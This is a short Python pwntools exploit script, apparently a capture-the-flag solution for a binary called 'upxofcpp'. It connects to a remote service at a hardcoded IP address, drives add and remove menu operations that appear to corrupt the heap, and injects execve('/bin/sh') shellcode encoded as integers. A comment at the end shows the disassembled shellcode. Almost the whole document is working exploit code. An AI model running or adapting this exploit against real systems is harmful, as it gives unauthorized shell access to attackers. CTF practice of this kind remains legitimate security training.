from pwn import *

#io = process("./upxofcpp")
io = remote('34.92.121.149', 10000)

def choice(c):
	io.sendlineafter("choice:",str(c))
def AddV(index,size,vlist):
	choice(1)
	io.sendlineafter("Index:",str(index))
	io.sendlineafter("Size:",str(size))
	#io.interactive()
	io.recvuntil(":")
	for i in range(size):
		sleep(0.1)
		io.sendline(str(vlist[i]))
		if(vlist[i] == -1):
			break
def RmV(index):
	choice(2)
	io.sendlineafter("index:",str(index))

#gdb.attach(io)

AddV(0,0x12,[2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,0x9036eb,0x909090])
AddV(1,0x10,[2,2,0x2fbf4890,0x2f6e6962,0x57006873,0x48c03148,0x3bb0e789,0x0fd23148,0xc305,-1])
AddV(2,0x10,[2,-1])
AddV(3,0x10,[2,-1])
AddV(4,6,[4,4,4,4,4,4])

RmV(0)
RmV(1)
RmV(2)
RmV(3)
# Show 3
#rsi = 0

io.interactive()
'''
0000000000400080 <_start>:
  400080:       f7 e6                   mul    %esi
  400082:       50                      push   %rax
  400083:       48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
  40008a:       2f 73 68 
  40008d:       57                      push   %rdi
  40008e:       48 89 e7                mov    %rsp,%rdi
  400091:       b0 3b                   mov    $0x3b,%al
  400093:       0f 05                   syscall 
'''
